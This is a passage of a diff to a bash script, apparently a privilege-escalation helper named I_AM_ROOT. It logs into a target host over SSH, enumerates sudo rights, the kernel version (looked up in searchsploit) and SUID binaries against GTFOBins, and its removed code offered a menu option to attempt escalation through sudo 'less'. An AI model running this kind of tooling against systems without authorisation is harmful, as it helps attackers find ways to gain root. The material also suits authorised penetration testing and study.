+        echo "  -> Check each against GTFOBins ('Sudo' section) for an escalation path."
+    else
+        type_out "$RED" "No sudo rights detected (or the password was rejected)."
+    fi
+    echo
+
+    # --- kernel / searchsploit --------------------------------------------
+    local kver short
+    kver=$(section KERNEL | head -n1)
+    type_out "$GREEN" "Kernel version: ${kver:-unknown}"
+    if require searchsploit && [[ -n $kver ]]; then
+        short=${kver%%-*}          # e.g. 5.4.0 from 5.4.0-42-generic
+        echo "searchsploit results for 'linux kernel $short':"
+        searchsploit "linux kernel" "$short" 2>/dev/null || true
+    fi
+    echo
+
+    # --- SUID / GTFOBins ---------------------------------------------------
+    gtfobins_scan
+    divider
+}
+
+# -------------------------------------------------------------- menu --------
+menu() {
+    local sel
+    while true; do
+        echo
+        echo "  1 - View SUID/GTFOBins privesc guide"
+        echo "  2 - View full enumeration report"
+        echo "  3 - Exit"
+        read -rp "  Select: " sel
+        case $sel in
+            1) if [[ -n $GTFO_FILE && -s $GTFO_FILE ]]; then
+                   "${PAGER:-less}" "$GTFO_FILE"
+               else
+                   echo "No GTFOBins matches were found."
+               fi ;;
+            2) "${PAGER:-less}" "$INFO" ;;
+            3) echo "Goodbye."; return 0 ;;
+            *) echo "Invalid selection." ;;
+        esac
+    done
+}
+
+# -------------------------------------------------------------- main --------
+main() {
     clear
+    banner
+    check_deps
+
+    read -rp "Target IP/host : " TARGET
+    while ! valid_target "$TARGET"; do
+        read -rp "Invalid target. Enter a valid IP or hostname: " TARGET
+    done
+    read -rp  "SSH username   : " USERNAME
+
+    choose_auth
+
+    # Reuse a single SSH connection for the test + enumeration so a key
+    # passphrase / password is only entered once.
+    CTL="${TMPDIR:-/tmp}/iar-$$-$RANDOM.sock"
+    SSHOPTS+=(-o ControlMaster=auto -o ControlPath="$CTL" -o ControlPersist=30)
+    trap cleanup EXIT
+
+    WORKDIR="$(pwd)/I_AM_ROOT/$TARGET"
+    mkdir -p "$WORKDIR"
+    STAMP=$(date +%Y.%m.%d-%H.%M.%S)
+    INFO="$WORKDIR/enum-$STAMP.txt"
+
+    test_connection
+    run_enum
+    analyze
+    menu
 }
 
-
-incorrect_selection() {
-    echo "Incorrect selection! Try again."
-}
-
-
-until [ "$selection" = "1" ] || [ "$selection" = "3" ]; do
-    clear
-    echo ""
-    echo "  1 - Attempt Privilege Escalation Using Sudo 'less'? "
-    echo "  2 - View file at ./I_AM_ROOT/$IP_ADDRESS/$REFI"
-    echo "  3 - EXIT"
-    echo ""
-    echo -n "   Enter selection: "
-    read selection
-    echo ""
-    case $selection in
-        1 ) clear; menu_option_one;;
-        2 ) clear; menu_option_two;;
-        3 ) clear; menu_option_three;;
-        * ) clear; incorrect_selection ; press_enter ;;
-    esac
-done
+main "$@"
